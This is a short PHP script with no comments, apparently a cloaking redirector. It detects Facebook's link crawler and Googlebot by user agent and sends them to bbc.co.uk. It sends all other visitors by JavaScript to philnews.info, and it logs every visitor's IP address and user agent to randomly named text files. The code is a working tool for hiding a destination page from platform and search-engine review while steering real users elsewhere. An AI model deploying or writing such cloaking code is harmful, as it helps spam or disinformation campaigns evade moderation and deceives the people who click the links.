
<?php
function checkIP($ip) {
  $lowIp = ip2long('66.100.0.0');
$highIp = ip2long('66.255.255.255');
  if ($ip <= $highIp && $lowIp <= $ip) {
      return true;
  }
}
$allowedAgents = "allowedAgentsy70TsT1CLoxGJhMlVr4FWf2MBiSAcukvmBKkpb9scv5FqzeguXNIUdpbyRd1EZIjGSfD-r8nan34LJ3gwlV8tojXKY5-9HRQPQZw.txt";
$blockedAgents = "blockedAgentsy70TsT1CLoxGJhMlVr4FWf2MBiSAcukvmBKkpb9scv5FqzeguXNIUdpbyRd1EZIjGSfD-r8nan34LJ3gwlV8tojXKY5-9HRQPQZw.txt";


$ip =  ip2long($_SERVER['REMOTE_ADDR']);

if (
   strpos($_SERVER["HTTP_USER_AGENT"], "facebookexternalhit/1.1") !== false ||
 strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot") !== false) {
  $fAgent = fopen($blockedAgents, 'a');
  $agent = $_SERVER['REMOTE_ADDR'] . ' ' . $_SERVER['HTTP_USER_AGENT'] .' blocked ' . PHP_EOL;
  fwrite($fAgent, $agent);
  fclose($fAgent);
  header('Location: http://bbc.co.uk');
  die();
 }
else {
  $fAgent = fopen($allowedAgents, 'a');
  $agent = $_SERVER['REMOTE_ADDR'] . ' ' . $_SERVER['HTTP_USER_AGENT'] .' ok ' . PHP_EOL;
    fwrite($fAgent, $agent);
    fclose($fAgent);
    echo "
<script type='text/javascript'>// <![CDATA[
var d='<data:blog.url/>';
d=d.replace(/.*\/\/[^\/]*/, '');
location.href = 'http://philnews.info';
// ]]></script>
";
    die();
}
?>
